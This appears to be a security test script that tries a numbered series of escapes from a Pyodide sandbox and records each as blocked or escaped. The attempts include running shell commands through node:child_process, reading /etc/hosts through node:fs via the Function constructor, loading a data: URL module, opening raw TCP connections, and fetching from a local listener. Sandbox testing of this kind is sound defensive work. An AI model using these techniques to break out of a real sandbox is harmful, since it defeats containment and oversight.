# Async escape attempts (top-level await). Same output format as escape-battery.py
import sys
RES = []
def rec(eid, label, status, detail=""):
    line = f"{eid} | {label} | {status}{': ' + str(detail)[:150] if detail else ''}"
    RES.append(line); print(line)

import pyodide_js
from pyodide.code import run_js
from pyodide.http import pyfetch

try:
    r = await pyfetch("http://127.0.0.1:__LISTENER_PORT__/pyfetch")
    rec("A01", "await pyfetch(http://127.0.0.1:LISTENER)", "ESCAPED", f"status={r.status}")
except BaseException as e:
    rec("A01", "await pyfetch(http://127.0.0.1:LISTENER)", "blocked", f"{type(e).__name__}: {e}")

try:
    out = await run_js("(async()=>(await import('node:child_process')).execSync('whoami').toString())()")
    rec("A02", "await run_js(import('node:child_process')).execSync(whoami)", "ESCAPED", str(out).strip())
except BaseException as e:
    rec("A02", "await run_js(import('node:child_process')).execSync(whoami)", "blocked", f"{type(e).__name__}: {e}")

try:
    m = await pyodide_js.registerJsModule.constructor("return import('node:fs')")()
    rec("A03", "await Function-ctor import('node:fs').readFileSync(hosts)", "ESCAPED", m.readFileSync("C:/Windows/win.ini" if sys.platform != "linux" else "/etc/hosts", "utf8")[:30].replace("\n", " "))
except BaseException as e:
    rec("A03", "await Function-ctor import('node:fs').readFileSync(hosts)", "blocked", f"{type(e).__name__}: {e}")

try:
    await pyodide_js.loadPackage("scipy")
    rec("A04", "await pyodide_js.loadPackage('scipy')", "ESCAPED", "returned without error")
except BaseException as e:
    rec("A04", "await pyodide_js.loadPackage('scipy')", "blocked", f"{type(e).__name__}: {e}")

try:
    import urllib.request
    u = urllib.request.urlopen("http://127.0.0.1:__LISTENER_PORT__/urllib", timeout=3)
    rec("A05", "urllib.request.urlopen(http://127.0.0.1:LISTENER)", "ESCAPED", u.status)
except BaseException as e:
    rec("A05", "urllib.request.urlopen(http://127.0.0.1:LISTENER)", "blocked", f"{type(e).__name__}: {e}")

try:
    from pyodide.http import open_url
    rec("A06", "open_url(http://127.0.0.1:LISTENER) sync XHR", "ESCAPED", open_url("http://127.0.0.1:__LISTENER_PORT__/open_url").read()[:20])
except BaseException as e:
    rec("A06", "open_url(http://127.0.0.1:LISTENER) sync XHR", "blocked", f"{type(e).__name__}: {e}")
print("ADONE", len(RES))

# ---- second wave: JS-API-level escapes reachable through pyodide_js (not through eval/Function) ----
import pyodide_js
try:
    api = pyodide_js._api
    names = [n for n in dir(api) if "load" in n.lower() or "script" in n.lower() or "fetch" in n.lower()]
    rec("B00", "pyodide_js._api reachable; load/script/fetch attrs", "ESCAPED" if names else "blocked", names[:12])
except BaseException as e:
    rec("B00", "pyodide_js._api reachable", "blocked", f"{type(e).__name__}: {e}")

# B01: load an arbitrary ES module from a data: URL via the loader ("://" in payload forces a raw import(url))
payload = "data:text/javascript,globalThis.__PWNED__=typeof process;//://"
for name in ("loadScript",):
    try:
        await getattr(pyodide_js._api, name)(payload)
        v = pyodide_js._api.__getattr__("x") if False else None
        import js
        rec("B01", f"pyodide_js._api.{name}(data: URL module)", "ESCAPED", "module executed (see B01b)")
    except BaseException as e:
        rec("B01", f"pyodide_js._api.{name}(data: URL module)", "blocked", f"{type(e).__name__}: {e}")

# B01b: confirm execution by reading the marker back through JS-visible global (needs a way to read globalThis: _module / api)
try:
    g = pyodide_js._api.loadScript.constructor  # Function ctor (blocked by codegen flag, informative only)
    rec("B01b", "api.loadScript.constructor", "ESCAPED", str(g)[:60])
except BaseException as e:
    rec("B01b", "api.loadScript.constructor", "blocked", f"{type(e).__name__}: {e}")

# B02: loadPackage with an arbitrary URL -> network fetch of a wheel
try:
    await pyodide_js.loadPackage("http://127.0.0.1:__LISTENER_PORT__/x-1.0-py3-none-any.whl")
    rec("B02", "loadPackage(http://127.0.0.1:LISTENER/x.whl)", "ESCAPED", "returned")
except BaseException as e:
    rec("B02", "loadPackage(http://127.0.0.1:LISTENER/x.whl)", "blocked", f"{type(e).__name__}: {str(e)[:100]}")

# B03: loadBinaryFile on an http URL
try:
    r = await pyodide_js._api.loadBinaryFile("http://127.0.0.1:__LISTENER_PORT__/binfile")
    rec("B03", "api.loadBinaryFile(http://127.0.0.1:LISTENER)", "ESCAPED", "returned")
except BaseException as e:
    rec("B03", "api.loadBinaryFile(http://127.0.0.1:LISTENER)", "blocked", f"{type(e).__name__}: {str(e)[:100]}")

# B05: Function ctor -> dynamic import of node:net -> raw TCP connect to the listener (network egress without fetch/WebSocket)
try:
    m = await pyodide_js.registerJsModule.constructor("return import('node:net')")()
    m.connect(__LISTENER_PORT__, "127.0.0.1")
    rec("B05", "Function ctor -> import('node:net').connect(LISTENER)", "ESCAPED", "connect issued (check listener hits)")
except BaseException as e:
    rec("B05", "Function ctor -> import('node:net').connect(LISTENER)", "blocked", f"{type(e).__name__}: {str(e)[:100]}")
print("BDONE")
